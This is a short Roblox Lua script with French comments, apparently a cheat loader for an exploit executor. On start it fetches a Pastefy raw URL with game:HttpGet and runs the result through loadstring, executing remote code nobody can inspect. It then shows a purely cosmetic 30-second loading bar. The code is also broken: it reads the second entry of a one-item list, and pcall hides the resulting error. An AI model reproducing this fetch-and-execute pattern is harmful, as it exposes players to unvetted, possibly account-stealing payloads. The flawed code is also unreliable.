-- Liste des scripts Pastefy
local scripts = {"https://pastefy.app/HYzs8Heo/raw"}
     -- Script 2 (à exécuter immédiatement)

-- Services utiles
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- 🟢 Exécuter immédiatement le script 2
pcall(function()
    loadstring(game:HttpGet(scripts[2]))()
end)

-- 🖼️ Interface de chargement
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ColorfulLoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = player:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0.4, 0, 0.1, 0)
Frame.Position = UDim2.new(0.3, 0, 0.45, 0)
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 8)

local LoadingBar = Instance.new("Frame")
LoadingBar.Size = UDim2.new(0, 0, 1, 0)
LoadingBar.Position = UDim2.new(0, 0, 0, 0)
LoadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
LoadingBar.BorderSizePixel = 0
LoadingBar.Parent = Frame

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(1, 0, 1, 0)
LoadingText.Position = UDim2.new(0, 0, 0, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Chargement..."
LoadingText.Font = Enum.Font.SourceSansBold
LoadingText.TextSize = 22
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.Parent = Frame

-- 🕒 Timer de 30 secondes avec animation
local duration = 30
for i = 1, duration do
    LoadingText.Text = "Chargement... (" .. tostring(duration - i + 1) .. "s)"
    
    local tween = TweenService:Create(LoadingBar, TweenInfo.new(1, Enum.EasingStyle.Linear), {
        Size = UDim2.new(i / duration, 0, 1, 0)
    })
    tween:Play()
    task.wait(1)
end

-- 🧼 Suppression du GUI en douceur
local fadeOut = TweenService:Create(Frame, TweenInfo.new(1), {BackgroundTransparency = 1})
local fadeOutText = TweenService:Create(LoadingText, TweenInfo.new(1), {TextTransparency = 1})
local fadeOutBar = TweenService:Create(LoadingBar, TweenInfo.new(1), {BackgroundTransparency = 1})

fadeOut:Play()
fadeOutText:Play()
fadeOutBar:Play()

fadeOut.Completed:Wait()
ScreenGui:Destroy()
